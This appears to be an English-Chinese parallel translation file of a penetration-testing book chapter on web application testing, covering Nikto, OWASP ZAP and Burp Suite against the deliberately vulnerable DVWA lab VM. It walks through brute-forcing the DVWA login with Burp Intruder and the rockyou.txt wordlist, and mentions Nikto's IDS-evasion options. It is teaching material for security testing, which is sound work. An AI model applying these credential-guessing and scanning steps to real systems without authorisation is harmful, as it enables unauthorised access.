- en: Web Application Testing
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Web应用程序测试
- en: In [Chapter 6](22aec58c-fc6d-4d03-9af6-4761ab499562.xhtml), *Vulnerability Scanning, *we
    looked at performing vulnerability scanning using Nessus and OpenVAS, two very
    powerful tools. In this chapter, we will be taking a look at tools specifically
    for web and web application scanning and attacking.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第6章](22aec58c-fc6d-4d03-9af6-4761ab499562.xhtml)中，*漏洞扫描*，我们看了使用Nessus和OpenVAS进行漏洞扫描，这两个都是非常强大的工具。在本章中，我们将专门研究用于Web和Web应用程序扫描和攻击的工具。
- en: Most applications that are developed these days integrate different web technologies.
    This increases the complexity and risk of exposing sensitive data. Web applications
    have always been a long-standing target for malicious adversaries to steal, manipulate,
    sabotage, and extort corporate businesses. This proliferation of web applications
    has brought forth enormous challenges for pentesters. The key is to secure a web
    application's frontend, its backend usually consists of databases, any additional
    microservices, and the overall network security. This is necessary because web
    applications act as a data-processing system, and the database is responsible
    for storing sensitive data (for example, credit cards, customer details, and authentication
    data).
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 如今开发的大多数应用程序集成了不同的Web技术。这增加了暴露敏感数据的复杂性和风险。Web应用程序一直是恶意对手窃取、操纵、破坏和勒索企业业务的长期目标。Web应用程序的大量增加给渗透测试人员带来了巨大的挑战。关键在于保护Web应用程序的前端，其后端通常包括数据库、任何额外的微服务和整体网络安全。这是必要的，因为Web应用程序充当数据处理系统，数据库负责存储敏感数据（例如信用卡、客户详细信息和身份验证数据）。
- en: The tools that we are going to look at in this chapter include web application
    recon and vulnerability scanners, proxies, database attack types, web attack tools,
    and some client/browser attack tools.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将介绍的工具包括Web应用程序侦察和漏洞扫描程序、代理、数据库攻击类型、Web攻击工具以及一些客户端/浏览器攻击工具。
- en: Technical requirements
  id: totrans-4
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'You will need the following  for this chapter:'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 本章需要以下内容：
- en: Kali Linux
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux
- en: '**OWASP Broken Web Applications** (**BWA**)'
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**OWASP Broken Web Applications** (**BWA**)'
- en: OWASP BWA is a preconfigured virtual machine from OWASP that has a collection
    of vulnerable web applications. We'll be working with one of the apps on the VM and
    that's **Damn Vulnerable Web App** (**DVWA**).
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: OWASP BWA是来自OWASP的预配置虚拟机，其中包含一些易受攻击的Web应用程序。我们将使用VM上的一个应用程序，即**Damn Vulnerable
    Web App** (**DVWA**)。
- en: Web analysis
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Web分析
- en: In this section, we'll be looking at the tools used to identify possible vulnerabilities
    in web applications. Some of these tools, specifically Burp Suite and OWASP ZAP,
    go beyond performing vulnerability assessments against web and cloud applications
    and provide you with the ability to attack these vulnerabilities, and you will
    see them appear further into the chapter.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将介绍用于识别Web应用程序可能漏洞的工具。其中一些工具，特别是Burp Suite和OWASP ZAP，不仅可以对Web和云应用程序执行漏洞评估，还可以攻击这些漏洞，并且您将在本章后面看到它们的出现。
- en: Based on the information we gather from the results of the various tools, we
    will be able to determine our attack vectors in attempts to gain access to the
    system through password attacks or exfiltrate data from databases or the system
    itself.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 根据我们从各种工具的结果中收集的信息，我们将能够确定我们的攻击向量，试图通过密码攻击或从数据库或系统本身中窃取数据来访问系统。
- en: Nikto
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Nikto
- en: Nikto is a basic web server security scanner. It scans and detects the vulnerabilities
    on web applications usually caused by misconfigurations on the server, default
    and insecure files, and outdated server applications. As Nikto is purely built
    on LibWhisker2, it supports out-of-the-box cross-platform deployment, SSL, host
    authentication methods (NTLM/Basic), proxies, and several IDS-evasion techniques.
    It also supports sub-domain enumeration, application security checks (XSS, SQL
    injection, and so on), and is capable of guessing authorization credentials using
    a dictionary-based password attack.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: Nikto是一个基本的Web服务器安全扫描程序。它扫描并检测Web应用程序上通常由服务器配置错误、默认和不安全文件以及过时的服务器应用程序引起的漏洞。由于Nikto纯粹基于LibWhisker2构建，因此它支持跨平台部署、SSL、主机身份验证方法（NTLM/基本）、代理和几种IDS逃避技术。它还支持子域枚举、应用程序安全检查（XSS、SQL注入等），并且能够使用基于字典的密码攻击来猜测授权凭据。
- en: 'To use `nikto`, you can navigate to the Applications menu | 03 – Web Application
    Analysis | Web Vulnerability Scanner | nikto, or in your Terminal simply type
    the following:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用`nikto`，您可以转到应用程序菜单| 03-Web应用程序分析| Web漏洞扫描程序| nikto，或者在终端中简单地输入以下内容：
- en: '[PRE0]'
  id: totrans-15
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Nikto can also be easily found by navigating to Applications | Vulnerability
    Analysis | nikto.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 要找到Nikto，可以轻松地转到应用程序|漏洞分析|nikto。
- en: 'By default, as previously seen with other applications, simply running the
    command will display the different options that we have available. To scan a target,
    enter `nikto -h <target> -p <port>`, where `<target>` is the domain or IP address
    of your target website and `<port>` is the port that the service is running on.
    For this scan, `nikto` will be targeted at a local VM known as the OSWAP BWA (available
    at [https://sourceforge.net/projects/owaspbwa/files/](https://sourceforge.net/projects/owaspbwa/files/)).
    OWASP BWA is a collection of deliberately vulnerable web applications in one VMware-based
    virtual machine:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，就像之前在其他应用程序中看到的那样，只需运行命令即可显示我们可用的不同选项。要扫描目标，请输入`nikto -h <target> -p <port>`，其中`<target>`是目标网站的域名或IP地址，`<port>`是服务运行的端口。对于这次扫描，`nikto`将针对一个名为OSWAP
    BWA的本地VM进行扫描（可在[https://sourceforge.net/projects/owaspbwa/files/](https://sourceforge.net/projects/owaspbwa/files/)找到）。OWASP
    BWA是一个基于VMware的虚拟机中的故意易受攻击的Web应用程序集合：
- en: '![](img/4401d8d5-6695-46f9-b4bd-56b535d2d504.jpg)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
  zh: '![](img/4401d8d5-6695-46f9-b4bd-56b535d2d504.jpg)'
- en: 'Reading through the snippet of results in the screen capture, in the first
    few lines, `nikto` tells us the IP address of the target and the hostname. After
    the basic target information, `nikto` displays the web server that''s running
    and its version, Apache 2.2.14, on a Ubuntu system with some modules that were
    loaded, for example `mod_perl/2.0.4` and `OpenSSL/0.9.8k`. Continuing down, we
    see some useful information, such as the path to the CGI folder (`/cgi-bin/`),
    and that some of the modules loaded are outdated:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 在屏幕截图中阅读结果片段时，在前几行中，`nikto`告诉我们目标的IP地址和主机名。在基本目标信息之后，`nikto`显示了正在运行的Web服务器及其版本，例如Ubuntu系统上的Apache
    2.2.14，并加载了一些模块，例如`mod_perl/2.0.4`和`OpenSSL/0.9.8k`。继续向下看，我们看到了一些有用的信息，例如CGI文件夹的路径(`/cgi-bin/`)，以及一些加载的模块已经过时：
- en: '![](img/98aa5ffd-fddf-460b-b1a9-4159f36b5e47.jpg)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
  zh: '![](img/98aa5ffd-fddf-460b-b1a9-4159f36b5e47.jpg)'
- en: Further down in the results, `nikto` displays OSVDB codes. OSVDB is the abbreviation
    for Open Source Vulnerability Database. This was an initiative started by professionals
    in the security industry officially in 2004 and was a database that stored technical
    information on security vulnerabilities (a vast majority being web application-related).
    Unfortunately, the service shut down in April 2016 due to lack of support and
    contributions, however, the team over at [http://cve.mitre.org](http://cve.mitre.org)
    have compiled a reference map that references the OSVDB to CVE entries ([http://cve.mitre.org/data/refs/refmap/source-OSVDB.html](http://cve.mitre.org/data/refs/refmap/source-OSVDB.html)).
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 在结果的更下方，`nikto`显示了OSVDB代码。OSVDB是开放式漏洞数据库的缩写。这是安全行业专业人士于2004年正式启动的一个倡议，是一个存储安全漏洞的技术信息的数据库（其中绝大多数是与Web应用程序相关的）。不幸的是，由于缺乏支持和贡献，该服务于2016年4月关闭，但是，[http://cve.mitre.org](http://cve.mitre.org)团队已经编制了一个参考地图，将OSVDB与CVE条目联系起来（[http://cve.mitre.org/data/refs/refmap/source-OSVDB.html](http://cve.mitre.org/data/refs/refmap/source-OSVDB.html)）。
- en: 'This can be used to get more details on the OSVDB codes that `nikto` has provided:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以用来获取`nikto`提供的OSVDB代码的更多详细信息：
- en: '![](img/87281aa4-a850-4ff6-8a16-938ce0c7320c.jpg)'
  id: totrans-23
  prefs: []
  type: TYPE_IMG
  zh: '![](img/87281aa4-a850-4ff6-8a16-938ce0c7320c.jpg)'
- en: 'Nikto has the functionality to identify web application vulnerabilities, such
    as information disclosure, injection (XSS/Script/HTML), remote file retrieval
    (server-wide), command execution, and software identification. In addition to
    the basic scanning demonstrated, Nikto allows the penetration tester to tailor
    scans to their particular target. The following are some of the options that can
    be utilized for scanning:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: Nikto具有识别Web应用程序漏洞的功能，例如信息泄露、注入（XSS/Script/HTML）、远程文件检索（服务器范围内）、命令执行和软件识别。除了基本扫描外，Nikto允许渗透测试人员定制其特定目标的扫描。以下是一些可用于扫描的选项：
- en: Using the `-T` command-line switch with individual test numbers will tailor
    the testing to specific types
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用`-T`命令行开关和单独的测试编号，可以将测试定制为特定类型
- en: By using `–t`, you can set the timeout value for each test response
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过使用`–t`，您可以为每个测试响应设置超时值
- en: '`-D V` controls the display output'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-D V`控制显示输出'
- en: '`-o` and `-F` define the scan report to be written in a particular format'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-o`和`-F`定义了要以特定格式编写的扫描报告'
- en: There are other advanced options, such as `–mutate` (to guess subdomains, files,
    directories, and usernames), `-evasion` (to bypass the IDS filter), and `-Single`
    (for single test mode), which you can use to assess your target in depth
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 还有其他高级选项，例如`–mutate`（猜测子域、文件、目录和用户名）、`-evasion`（绕过IDS过滤器）和`-Single`（用于单个测试模式），您可以使用这些选项深入评估您的目标
- en: OWASP ZAP
  id: totrans-30
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: OWASP ZAP
- en: '**OWASP Zed Attack Proxy** (**ZAP**) is a web application vulnerability scanner.
    Created by the OWASP project, this is a Java-based open source scanner that has
    a great deal of functionality. It includes web crawlers, vulnerability identification,
    and fuzzing analysis, and can serve as a web proxy. To launch ZAP, go to Applications
    | Web Application Analysis | owasp-zap, or in the Terminal enter:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '**OWASP Zed Attack Proxy**（**ZAP**）是一个Web应用程序漏洞扫描器。由OWASP项目创建，这是一个基于Java的开源扫描器，具有很多功能。它包括Web爬虫、漏洞识别和模糊分析，并且可以作为Web代理。要启动ZAP，转到应用程序|Web应用程序分析|owasp-zap，或在终端中输入：'
- en: '[PRE1]'
  id: totrans-32
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '![](img/71e97514-84d9-4bcf-94c0-aed7c744a4f0.jpg)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![](img/71e97514-84d9-4bcf-94c0-aed7c744a4f0.jpg)'
- en: 'Once loaded, it''s easy to get started with scanning the target site. On the
    main screen in ZAP, there is a field to enter the address of the target. This
    time, the target is one of the vulnerable web apps on the BWA virtual machine,
    DVWA. After entering the target, click the Attack button and watch ZAP go to work:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 加载后，很容易开始扫描目标站点。在ZAP的主屏幕上，有一个字段用于输入目标的地址。这次，目标是BWA虚拟机上易受攻击的Web应用程序之一，DVWA。输入目标后，单击“Attack”按钮，观察ZAP的工作：
- en: '![](img/313b3bfa-343c-4254-9121-6ccdfdb10b43.jpg)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![](img/313b3bfa-343c-4254-9121-6ccdfdb10b43.jpg)'
- en: 'The results of the scan appear in the bottom on the main screen. The first
    step that ZAP takes when scanning a site is to identify, or crawl, the entire
    site, following links that are associated with the host:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描结果出现在主屏幕底部。ZAP扫描站点时的第一步是识别或爬行整个站点，跟随与主机相关的链接：
- en: '![](img/894b06db-1646-4a85-8ee5-85681d03bbe1.jpg)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![](img/894b06db-1646-4a85-8ee5-85681d03bbe1.jpg)'
- en: 'After crawling the site, ZAP conducts a number of different checks against
    common web application vulnerabilities. These are indicated under the Alerts tab
    in the bottom left-hand corner. For example, the following are the vulnerabilities
    identified by ZAP on the DVWA application:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 在爬行网站之后，ZAP对常见的Web应用程序漏洞进行了多种不同的检查。这些漏洞在左下角的警报选项卡下显示。例如，以下是ZAP在DVWA应用程序上识别的漏洞：
- en: '![](img/ff9e27d1-3cb4-4a63-a676-ce663c9497c6.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ff9e27d1-3cb4-4a63-a676-ce663c9497c6.jpg)'
- en: 'You can then drill down on specific site pathways to determine exactly where
    these vulnerabilities present themselves; in this case, we see that `login.php`
    is vulnerable to SQL injection:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，您可以深入研究特定站点路径，以确定这些漏洞确切出现的位置；在这种情况下，我们看到`login.php`容易受到SQL注入的攻击：
- en: '![](img/b82cf09a-af57-475c-ae2a-e0ade2de65f1.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b82cf09a-af57-475c-ae2a-e0ade2de65f1.jpg)'
- en: Scanning is just the surface of all the tools ZAP has to offer. For more information
    about ZAP, OWASP has resources located at [https://www.owasp.org/index.php/ZAP](https://www.owasp.org/index.php/ZAP).
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描只是ZAP提供的所有工具的表面。有关ZAP的更多信息，OWASP的资源位于[https://www.owasp.org/index.php/ZAP](https://www.owasp.org/index.php/ZAP)。
- en: Burp Suite
  id: totrans-43
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Burp Suite
- en: Burp Suite is a combination of powerful web application security tools. These
    tools demonstrate the real-world capabilities of an attacker penetrating web applications.
    They can scan, analyze, and exploit web applications using manual and automated
    techniques. The integration facility between the interfaces of these tools provides
    a complete attack platform to share information between one or more tools. This
    makes the Burp Suite a very effective and easy-to-use web application attack framework.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: Burp Suite是强大的Web应用程序安全工具的组合。这些工具展示了攻击者渗透Web应用程序的真实能力。它们可以使用手动和自动技术扫描、分析和利用Web应用程序。这些工具之间的接口集成设施提供了一个完整的攻击平台，可以在一个或多个工具之间共享信息。这使得Burp
    Suite成为一个非常有效和易于使用的Web应用程序攻击框架。
- en: 'To start Burp Suite, navigate to Applications | Web Application Analysis |
    burpsuite or use the Terminal to execute the following command:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动Burp Suite，请导航到应用程序|Web应用程序分析|burpsuite或使用终端执行以下命令：
- en: '[PRE2]'
  id: totrans-46
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'When Burp is launched for the first time, you''ll be asked to accept the Terms
    and Conditions and also set up your Project Environment (leaving everything default
    is sufficient for now):'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 当首次启动Burp时，您将被要求接受条款和条件，并设置您的项目环境（现在保持默认设置就足够了）：
- en: '![](img/deadaeb5-fd90-4dc5-89bb-039702b87c09.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![](img/deadaeb5-fd90-4dc5-89bb-039702b87c09.jpg)'
- en: 'You will be presented with a Burp Suite window on your screen. All the integrated
    tools (Target, Proxy, Spider, Scanner, Intruder, Repeater, Sequencer, Decoder,
    and Comparer) can be accessed via their individual tabs. You can get more details
    about their usage and configuration through the Help menu or by visiting [http://www.portswigger.net/burp/help/](http://www.portswigger.net/burp/help/).
    Please note that Burp Suite is available in three different editions: **Free (Community)**,
    Professional, and Enterprise. The free community edition is the version available
    in Kali.'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 您将在屏幕上看到一个Burp Suite窗口。所有集成工具（目标、代理、蜘蛛、扫描器、入侵者、重复者、顺序器、解码器和比较器）都可以通过它们各自的选项卡访问。您可以通过帮助菜单或访问[http://www.portswigger.net/burp/help/](http://www.portswigger.net/burp/help/)获取有关它们的使用和配置的更多详细信息。请注意，Burp
    Suite有三个不同的版本：**免费（社区）**、专业版和企业版。Kali中提供的是免费社区版。
- en: As mentioned before, Burp Suite comes with its own Spider. The application-aware
    spider, or burpspider, is a web crawler, which is essentially a bot that systematically
    browses a target site along with all its inner pages and maps its structure.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，Burp Suite自带其自己的Spider。应用程序感知蜘蛛，或burpspider，是一个网络爬虫，本质上是一个系统地浏览目标站点及其所有内部页面并映射其结构的机器人。
- en: 'For our example, we''ll be using Burp to crack the login credentials to gain
    access to the DVWA application. First, we need to set up our proxy and verify
    that the IP is set to the localhost IP and the port should be `8080`. Go to the
    Proxy tab followed by the Options sub-tab:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的示例中，我们将使用Burp来破解登录凭据以访问DVWA应用程序。首先，我们需要设置代理，并验证IP是否设置为本地主机IP，端口应为`8080`。转到代理选项卡，然后转到选项子选项卡：
- en: '![](img/500cfbaf-39f8-4531-b1fc-429fc5fdae33.jpg)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
  zh: '![](img/500cfbaf-39f8-4531-b1fc-429fc5fdae33.jpg)'
- en: 'Also, verify that the Intercept option is on under the Proxy tab, then check
    for Intercept is on tab:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 还要验证代理选项在代理选项卡下是否打开，然后检查是否打开拦截选项卡：
- en: '![](img/78a997ee-8fc4-4016-964d-ab11dfc64b0d.jpg)'
  id: totrans-54
  prefs: []
  type: TYPE_IMG
  zh: '![](img/78a997ee-8fc4-4016-964d-ab11dfc64b0d.jpg)'
- en: Once completed, open your browser and head to Options | Preferences | Advanced
    | Network | Connection Settings.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 完成后，打开浏览器，转到选项|首选项|高级|网络|连接设置。
- en: 'You''ll need to set the browser to your proxy now:'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，您需要将浏览器设置为代理：
- en: '![](img/fb5bfd99-ef09-473d-98b9-5659485d304e.jpg)'
  id: totrans-57
  prefs: []
  type: TYPE_IMG
  zh: '![](img/fb5bfd99-ef09-473d-98b9-5659485d304e.jpg)'
- en: 'So that''s our initial setup. Now, we''ll need to visit the target site, in
    this case, `192.168.0.32/dvwa`:'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 这就是我们的初始设置。现在，我们需要访问目标站点，即`192.168.0.32/dvwa`：
- en: '![](img/baed0a38-4877-4f90-ab62-fe196228c75c.jpg)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![](img/baed0a38-4877-4f90-ab62-fe196228c75c.jpg)'
- en: 'Once the address is entered, it should remain in a connecting loop. However,
    if you look at the Burp Suite interface, you can see some data:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 输入地址后，它应该保持在连接循环中。但是，如果您查看Burp Suite界面，您可以看到一些数据：
- en: '![](img/57d34d84-fafe-40d5-be39-4428f087ac79.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![](img/57d34d84-fafe-40d5-be39-4428f087ac79.jpg)'
- en: After clicking Forward a few times, the browser should load to the web page.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 点击几次“前进”后，浏览器应该加载到网页。
- en: 'In Burp Suite, under the Target tab, you will now have some data in the Site
    Map tab:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 在Burp Suite中，在目标选项卡下，现在在站点地图选项卡中有一些数据：
- en: '![](img/ffe3b02e-aa62-42dd-8b87-d02c6371503d.jpg)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ffe3b02e-aa62-42dd-8b87-d02c6371503d.jpg)'
- en: From there, it's a matter of right-clicking on the host and selecting Spider
    From here or Spider From Host.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，只需右键单击主机并选择从此处蜘蛛或从主机蜘蛛。
- en: Now, somewhere along the line, you should get a popup indicating that burpspider
    has found a form that is requesting some information. Burpspider will always pop
    up when it finds a form. Remember, forms can request user credentials or can be
    a simple search/query/lookup form.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，在某个地方，您应该会收到一个弹出窗口，指示burpspider发现了一个请求一些信息的表单。当burpspider发现表单时，它总是会弹出。请记住，表单可以请求用户凭据，也可以是一个简单的搜索/查询/查找表单。
- en: 'With that said, in our case, it''s a login form:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 说到这一点，在我们的情况下，这是一个登录表单：
- en: '![](img/a0bb27ac-f263-4dcc-946c-07d7ba2d49a1.jpg)'
  id: totrans-68
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a0bb27ac-f263-4dcc-946c-07d7ba2d49a1.jpg)'
- en: Back on our page on the target site, let's generate some traffic for Burp Suite's
    Intruder tool by entering some random credentials in the login form on the page.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 回到目标站点上的页面，通过在页面上的登录表单中输入一些随机凭据，为Burp Suite的入侵者工具生成一些流量。
- en: 'After entering the credentials, look at our interceptor:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 输入凭据后，查看我们的拦截器：
- en: '![](img/a6502260-533e-414e-a79e-64c5eafd4fc9.jpg)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a6502260-533e-414e-a79e-64c5eafd4fc9.jpg)'
- en: Note the key information we get, the username and password, and verify on the
    web page how it indicates to us that the credentials we entered were wrong. In
    this case, it tells us `Login` failed in a simple string message, however, there
    may be times where it may be a popup or a cookie.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 注意我们得到的关键信息，用户名和密码，并在网页上验证它如何告诉我们我们输入的凭据是错误的。在这种情况下，它告诉我们`登录`失败了，是一个简单的字符串消息，然而，有时可能会是一个弹出窗口或一个cookie。
- en: Now, right-click the target and select Send to Intruder.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，右键单击目标，选择发送到Intruder。
- en: 'Under the Intruder tab, select the Positions tab:'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 在Intruder选项卡下，选择Positions选项卡：
- en: '![](img/3ff47182-3ac5-4e01-b239-acc188de7372.jpg)'
  id: totrans-75
  prefs: []
  type: TYPE_IMG
  zh: '![](img/3ff47182-3ac5-4e01-b239-acc188de7372.jpg)'
- en: The username and password are the text we entered as the username and the password.
    Note that by default, more fields or positions may be highlighted. To clear these,
    simply click on the field we don't want and click the Clear button to the right.
    These fields or positions are where Intruder will replace it with payloads that
    we define, in this case, usernames and passwords.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 用户名和密码是我们输入的用户名和密码。请注意，默认情况下，可能会突出显示更多字段或位置。要清除这些字段，只需单击我们不想要的字段，然后单击右侧的清除按钮。这些字段或位置是Intruder将用我们定义的负载替换的地方，本例中是用户名和密码。
- en: 'Before we continue, verify that the Attack type is set to Cluster bomb. Now,
    go to the Payloads tab:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 在继续之前，请验证攻击类型是否设置为Cluster bomb。现在，转到Payloads选项卡：
- en: '![](img/e6077949-ce94-45ef-9d32-fb0966c9eac5.jpg)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![](img/e6077949-ce94-45ef-9d32-fb0966c9eac5.jpg)'
- en: When you click on the Payload set drop-down menu, the count in there should
    reflect the number of positions in the Positions tab.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 当您点击负载集下拉菜单时，其中的计数应反映在位置选项卡中的位置数。
- en: Now, select 1, which will correspond to the username field, and set Payload
    type to Simple list. In the Payload Options section under the Payload Sets section,
    enter the username in the text field labelled Enter a new item and then click
    Add. This will be used by Intruder as the username. You can add multiple usernames.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，选择1，这将对应用户名字段，并将负载类型设置为Simple list。在Payload Sets部分的Payload Options部分中，输入用户名在标有“输入新项目”的文本字段中，然后点击添加。这将被Intruder用作用户名。您可以添加多个用户名。
- en: 'For now, I''ll enter only the `admin` username to test with:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 目前，我只会输入`admin`用户名进行测试：
- en: '![](img/736cd79a-37b5-4466-8eb4-74c662418ba4.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![](img/736cd79a-37b5-4466-8eb4-74c662418ba4.jpg)'
- en: 'Now, let''s set Payload set 2, which is the password field. Instead of entering
    passwords one by one, click on the Load button and load up one of your password
    files (`rockyou.txt` is located in Kali at `/usr/share/wordlist`):'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们设置负载集2，即密码字段。不要逐个输入密码，点击加载按钮，加载你的密码文件之一（`rockyou.txt`位于Kali的`/usr/share/wordlist`中）：
- en: '![](img/16ce6bca-de95-4800-a252-50fc65fef984.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_IMG
  zh: '![](img/16ce6bca-de95-4800-a252-50fc65fef984.jpg)'
- en: 'Once all is set, click Start attack:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 一切设置好后，点击开始攻击：
- en: '![](img/d3de747d-c506-46fb-8876-c5dd852c0029.jpg)'
  id: totrans-86
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d3de747d-c506-46fb-8876-c5dd852c0029.jpg)'
- en: This screenshot shows the Results pop-up window. Looking at the results, all
    attempts got a Status (HTTP Response code) of `302`. A quick Google of HTTP response
    codes indicates that this leads to a redirect, but a redirect to where?
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 这个截图显示了结果弹出窗口。查看结果，所有尝试都得到了`302`的状态（HTTP响应代码）。快速搜索HTTP响应代码表明这会导致重定向，但重定向到哪里呢？
- en: If we click on each result and then select the Response tab, you would see that
    the only result that redirects to `index.php` is `admin:password`. We can now
    go to the DVWA login page and enter the credentials, granting access to the site.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们点击每个结果，然后选择响应选项卡，你会看到唯一重定向到`index.php`的结果是`admin:password`。现在我们可以转到DVWA登录页面，输入凭据，获得对该站点的访问权限。
- en: We can also verify this in Burp Suite by using another tool, Repeater. Repeater
    is used to manually modify the HTTP requests and data being sent in the requests.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以通过Burp Suite中的另一个工具Repeater来验证这一点。Repeater用于手动修改HTTP请求和请求中发送的数据。
- en: Going back to the Target tab, select the `POST` request for `login.php`. This
    is the form request that is sending the username and password. Right-click it
    and choose Send to Repeater.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 回到目标选项卡，选择`login.php`的`POST`请求。这是发送用户名和密码的表单请求。右键单击它，选择发送到Repeater。
- en: 'Now, select the Repeater tab:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，选择Repeater选项卡：
- en: '![](img/8909c91a-5ac7-4917-868f-453a9b07042e.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![](img/8909c91a-5ac7-4917-868f-453a9b07042e.jpg)'
- en: 'After `password=`, remove the incorrect password and enter the password that
    redirected us to `index.php`. In this case, the password is `password`. Once done,
    click Go:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 在`password=`之后，删除错误的密码，输入将我们重定向到`index.php`的密码。在这种情况下，密码是`password`。完成后，点击Go：
- en: '![](img/c08a5aa8-f955-4454-aeae-020e3c90b1e8.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c08a5aa8-f955-4454-aeae-020e3c90b1e8.jpg)'
- en: 'In the Response panel, we see Location: `index.php`. Now, click the Follow
    redirection button on the top. This produces the raw HTML, as well as a rendering,
    under the Render tab, of what the page should look like:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
